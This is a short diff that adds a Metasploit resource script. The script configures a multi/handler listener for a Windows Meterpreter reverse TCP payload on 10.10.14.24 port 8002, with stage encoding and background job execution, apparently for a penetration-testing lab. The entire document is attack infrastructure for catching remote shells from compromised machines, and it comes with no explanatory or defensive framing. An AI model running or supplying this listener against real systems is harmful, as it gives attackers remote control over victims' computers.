@@ -1,0 +1,7 @@
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.24
+set LPORT 8002
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
